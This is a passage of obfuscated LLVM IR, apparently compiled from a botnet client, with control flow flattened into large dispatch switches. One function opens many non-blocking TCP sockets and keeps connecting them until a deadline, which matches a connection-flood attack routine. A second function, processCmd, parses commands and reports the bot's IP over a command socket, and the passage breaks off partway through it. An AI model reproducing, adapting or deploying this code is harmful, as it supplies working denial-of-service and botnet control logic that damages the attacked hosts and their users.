  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -1617940540, label %first
    i32 -318575696, label %34
    i32 -154371480, label %35
    i32 -921597663, label %51
    i32 1155615973, label %56
    i32 -1919669006, label %57
    i32 -1944787520, label %62
    i32 -1296006939, label %NodeBlock3
    i32 49956592, label %NodeBlock
    i32 1949429247, label %LeafBlock1
    i32 197903747, label %LeafBlock
    i32 -1261606836, label %73
    i32 -491364033, label %101
    i32 -1869043705, label %106
    i32 -1176131353, label %113
    i32 -952567298, label %118
    i32 -1899785382, label %119
    i32 467616344, label %120
    i32 2042097523, label %129
    i32 979963102, label %130
    i32 1304808442, label %162
    i32 -200385941, label %173
    i32 762217384, label %184
    i32 -1857022885, label %189
    i32 36200141, label %190
    i32 -1084203730, label %194
    i32 -1276109037, label %205
    i32 -1341755896, label %206
    i32 495580053, label %207
    i32 -1486445571, label %208
    i32 2109050904, label %217
    i32 -1861921466, label %218
    i32 -852744716, label %250
    i32 -2065773454, label %261
    i32 611261596, label %NewDefault
    i32 829475894, label %262
    i32 1025316258, label %263
    i32 -1188966409, label %266
    i32 -355991526, label %267
    i32 -1129305962, label %269
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %32 = icmp ne i32 %.reload, 0
  %33 = select i1 %32, i32 -318575696, i32 -154371480
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1129305962, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store %struct.state_t* %41, %struct.state_t** %.reg2mem6
  %.reload28 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %42 = bitcast %struct.state_t* %.reload28 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  %46 = call noalias i8* @malloc(i64 1024) #2
  store i8* %46, i8** %16, align 8
  %47 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 1024, i32 1, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %17, align 4
  store i32 -921597663, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %17, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  %55 = select i1 %54, i32 1155615973, i32 -355991526
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 -1919669006, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  %61 = select i1 %60, i32 -1944787520, i32 -1188966409
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %.reload27 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload27, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  store i32 %68, i32* %.reg2mem29
  store i32 -1296006939, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem29
  %Pivot4 = icmp slt i32 %.reload33, 1
  %69 = select i1 %Pivot4, i32 197903747, i32 49956592
  store i32 %69, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem29
  %Pivot = icmp slt i32 %.reload31, 2
  %70 = select i1 %Pivot, i32 -1899785382, i32 1949429247
  store i32 %70, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf2 = icmp eq i32 %.reload30, 2
  %71 = select i1 %SwitchLeaf2, i32 495580053, i32 611261596
  store i32 %71, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf = icmp eq i32 %.reload32, 0
  %72 = select i1 %SwitchLeaf, i32 -1261606836, i32 611261596
  store i32 %72, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload26, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  store i32 %74, i32* %78, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %88, i32 3, i8* null)
  %90 = or i32 %89, 2048
  %91 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 4, i32 %90)
  %92 = load i32, i32* %8, align 4
  %93 = sext i32 %92 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %93
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %98 = call i32 @connect(i32 %96, %struct.sockaddr* %97, i32 16)
  %99 = icmp ne i32 %98, -1
  %100 = select i1 %99, i32 -1869043705, i32 -491364033
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32* @__errno_location() #13
  %103 = load i32, i32* %102, align 4
  %104 = icmp ne i32 %103, 115
  %105 = select i1 %104, i32 -1869043705, i32 -1176131353
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %8, align 4
  %108 = sext i32 %107 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %108
  %110 = getelementptr inbounds %struct.state_t, %struct.state_t* %109, i32 0, i32 0
  %111 = load i32, i32* %110, align 8
  %112 = call i32 @close(i32 %111)
  store i32 -952567298, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %8, align 4
  %115 = sext i32 %114 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %115
  %117 = getelementptr inbounds %struct.state_t, %struct.state_t* %116, i32 0, i32 1
  store i8 1, i8* %117, align 4
  store i32 -952567298, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 829475894, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 467616344, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %121, i64 0, i64 0
  %123 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %122) #2, !srcloc !7
  %124 = extractvalue { i64, i64* } %123, 0
  %125 = extractvalue { i64, i64* } %123, 1
  %126 = trunc i64 %124 to i32
  store i32 %126, i32* %18, align 4
  %127 = ptrtoint i64* %125 to i64
  %128 = trunc i64 %127 to i32
  store i32 %128, i32* %19, align 4
  store i32 2042097523, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 979963102, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = srem i32 %135, 64
  %137 = zext i32 %136 to i64
  %138 = shl i64 1, %137
  %139 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %140 = load i32, i32* %8, align 4
  %141 = sext i32 %140 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %141
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = sdiv i32 %144, 64
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [16 x i64], [16 x i64]* %139, i64 0, i64 %146
  %148 = load i64, i64* %147, align 8
  %149 = or i64 %148, %138
  store i64 %149, i64* %147, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %150, align 8
  %151 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %151, align 8
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %153
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 8
  %157 = add nsw i32 %156, 1
  %158 = call i32 @select(i32 %157, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %158, i32* %15, align 4
  %159 = load i32, i32* %15, align 4
  %160 = icmp eq i32 %159, 1
  %161 = select i1 %160, i32 1304808442, i32 36200141
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = bitcast i32* %14 to i8*
  %169 = call i32 @getsockopt(i32 %167, i32 1, i32 4, i8* %168, i32* %13) #2
  %170 = load i32, i32* %14, align 4
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -200385941, i32 762217384
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  store i32 -1857022885, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  store i32 -1857022885, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -1341755896, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, -1
  %193 = select i1 %192, i32 -1084203730, i32 -1276109037
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = call i32 @close(i32 %199)
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 1
  store i8 0, i8* %204, align 4
  store i32 -1276109037, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 -1341755896, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 829475894, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 -1486445571, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %210 = getelementptr inbounds [16 x i64], [16 x i64]* %209, i64 0, i64 0
  %211 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %210) #2, !srcloc !8
  %212 = extractvalue { i64, i64* } %211, 0
  %213 = extractvalue { i64, i64* } %211, 1
  %214 = trunc i64 %212 to i32
  store i32 %214, i32* %20, align 4
  %215 = ptrtoint i64* %213 to i64
  %216 = trunc i64 %215 to i32
  store i32 %216, i32* %21, align 4
  store i32 2109050904, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 -1861921466, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = srem i32 %223, 64
  %225 = zext i32 %224 to i64
  %226 = shl i64 1, %225
  %227 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = sdiv i32 %232, 64
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [16 x i64], [16 x i64]* %227, i64 0, i64 %234
  %236 = load i64, i64* %235, align 8
  %237 = or i64 %236, %226
  store i64 %237, i64* %235, align 8
  %238 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %238, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %239, align 8
  %240 = load i32, i32* %8, align 4
  %241 = sext i32 %240 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %241
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 8
  %245 = add nsw i32 %244, 1
  %246 = call i32 @select(i32 %245, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %246, i32* %15, align 4
  %247 = load i32, i32* %15, align 4
  %248 = icmp ne i32 %247, 0
  %249 = select i1 %248, i32 -852744716, i32 -2065773454
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  store i32 -2065773454, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 829475894, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 829475894, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 1025316258, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  store i32 -1919669006, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 -921597663, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  store i32 -1129305962, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %267, %266, %263, %262, %NewDefault, %261, %250, %218, %217, %208, %207, %206, %205, %194, %190, %189, %184, %173, %162, %130, %129, %120, %119, %118, %113, %106, %101, %73, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %62, %57, %56, %51, %35, %34, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  store i32 %52, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1163958354, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1163958354, label %first
    i32 152766367, label %55
    i32 618118604, label %58
    i32 -288934224, label %65
    i32 -724507249, label %70
    i32 -119307206, label %77
    i32 -318826194, label %81
    i32 -665035919, label %84
    i32 -2068934320, label %91
    i32 -383299981, label %95
    i32 1906785941, label %96
    i32 -222738703, label %101
    i32 -983928457, label %108
    i32 -1536299738, label %112
    i32 1813299149, label %113
    i32 1384997178, label %118
    i32 744682396, label %120
    i32 119568558, label %124
    i32 -1997189248, label %125
    i32 -1609373286, label %126
    i32 875759363, label %129
    i32 253137193, label %130
    i32 1231901761, label %137
    i32 -2085441607, label %141
    i32 1668949539, label %148
    i32 16254396, label %155
    i32 375313365, label %156
    i32 -1079013532, label %172
    i32 -1412049000, label %175
    i32 481821855, label %179
    i32 652172429, label %183
    i32 -504876059, label %187
    i32 289043547, label %189
    i32 1081120292, label %190
    i32 208771550, label %194
    i32 544235776, label %195
    i32 -12799566, label %199
    i32 1766984258, label %200
    i32 -1968395227, label %207
    i32 -1031524394, label %211
    i32 -951540168, label %218
    i32 2007174185, label %225
    i32 2007493097, label %226
    i32 -1750620499, label %242
    i32 -575530817, label %245
    i32 2144772400, label %249
    i32 -1690452654, label %253
    i32 -896815630, label %259
    i32 -1238981734, label %261
    i32 -164726242, label %262
    i32 -4956546, label %266
    i32 1826388650, label %267
    i32 1947349908, label %271
    i32 -837649149, label %272
    i32 409622102, label %279
    i32 1681263931, label %283
    i32 -715583431, label %290
    i32 810941502, label %297
    i32 -899572219, label %304
    i32 1860695492, label %311
    i32 -1583944002, label %318
    i32 -519571725, label %325
    i32 -1533159125, label %329
    i32 1431258748, label %336
    i32 2066194504, label %337
    i32 -462948125, label %360
    i32 1309119246, label %365
    i32 27030110, label %366
    i32 -643380023, label %371
    i32 -987719410, label %374
    i32 1249180597, label %378
    i32 -1001277038, label %382
    i32 -1307175177, label %389
    i32 286009288, label %391
    i32 144791630, label %392
    i32 2077741790, label %396
    i32 -2096551599, label %397
    i32 213562977, label %404
    i32 -988998933, label %405
    i32 -1428153485, label %412
    i32 202533588, label %416
    i32 153330386, label %423
    i32 1717673958, label %430
    i32 435407319, label %431
    i32 454293354, label %447
    i32 -621049251, label %450
    i32 -1265249496, label %454
    i32 -1462372762, label %458
    i32 1470493211, label %462
    i32 550383243, label %464
    i32 -1824599835, label %465
    i32 1630946879, label %469
    i32 365831904, label %470
    i32 1607253544, label %474
    i32 1065345409, label %475
    i32 -1001191415, label %482
    i32 -752475510, label %486
    i32 -1871982983, label %493
    i32 1738279267, label %494
    i32 -957772299, label %506
    i32 -360869093, label %509
    i32 -1733118468, label %513
    i32 528659750, label %517
    i32 -1140196367, label %518
    i32 -771218290, label %522
    i32 656010877, label %527
    i32 204427369, label %530
    i32 824547179, label %532
    i32 -2009164037, label %533
    i32 -2091781421, label %537
    i32 -412212832, label %538
    i32 -2018601254, label %539
    i32 -1718657698, label %543
    i32 1234578545, label %548
    i32 1288991404, label %551
    i32 -1008405830, label %552
    i32 915498450, label %559
    i32 631938139, label %563
    i32 473624561, label %570
    i32 1269920982, label %577
    i32 -1211119159, label %578
    i32 1815182434, label %594
    i32 -1841070081, label %597
    i32 -1756775969, label %601
    i32 -2117590039, label %605
    i32 -472251543, label %611
    i32 41924369, label %613
    i32 811344434, label %614
    i32 510593376, label %618
    i32 -261757425, label %619
    i32 -1511217997, label %623
    i32 -189627271, label %624
    i32 -290773505, label %631
    i32 -1669121317, label %635
    i32 1907221555, label %642
    i32 1302227476, label %649
    i32 976279509, label %650
    i32 -1092532633, label %666
    i32 -1070141248, label %669
    i32 1386585032, label %673
    i32 -2128824067, label %677
    i32 -930715847, label %686
    i32 -209795591, label %688
    i32 -1820226440, label %689
    i32 1832951847, label %693
    i32 -1168852112, label %694
    i32 -1618700991, label %701
    i32 -1703202806, label %702
    i32 -867218446, label %709
    i32 1581672832, label %713
    i32 2047332956, label %720
    i32 -113887702, label %727
    i32 1315765453, label %734
    i32 1883258704, label %741
    i32 1227300810, label %745
    i32 443474371, label %752
    i32 -1247881128, label %756
    i32 1331394146, label %763
    i32 1900494727, label %764
    i32 884902484, label %786
    i32 -777518794, label %791
    i32 295500757, label %792
    i32 -1402605199, label %796
    i32 -1081605824, label %801
    i32 702964543, label %802
    i32 -666542464, label %807
    i32 1778394885, label %810
    i32 -1866736571, label %814
    i32 -617294523, label %818
    i32 945821307, label %826
    i32 1934643377, label %828
    i32 1686751208, label %829
    i32 310600487, label %833
    i32 -1092210317, label %834
    i32 56859506, label %842
    i32 -2055742243, label %843
    i32 1556674205, label %850
    i32 1928161300, label %851
    i32 -867671671, label %856
    i32 1270850138, label %863
    i32 -1960748518, label %871
    i32 -377452916, label %879
    i32 -1182032713, label %880
    i32 -67052599, label %883
    i32 -1936309781, label %884
    i32 -2090270215, label %891
    i32 -817571541, label %892
    i32 -1629587158, label %899
    i32 1517412714, label %908
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %53 = icmp ne i32 %.reload, 0
  %54 = select i1 %53, i32 618118604, i32 152766367
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0))
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 0
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @strcmp(i8* %61, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.68, i32 0, i32 0)) #10
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -724507249, i32 -288934224
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* @mainCommSock, align 4
  %67 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %68 = call i8* @inet_ntoa(i32 %67) #2
  %69 = call i32 (i32, i8*, ...) @sockprintf(i32 %66, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* %68)
  store i32 1517412714, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8**, i8*** %4, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @strcmp(i8* %73, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0)) #10
  %75 = icmp ne i32 %74, 0
  %76 = select i1 %75, i32 253137193, i32 -119307206
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %3, align 4
  %79 = icmp ne i32 %78, 2
  %80 = select i1 %79, i32 -318826194, i32 -665035919
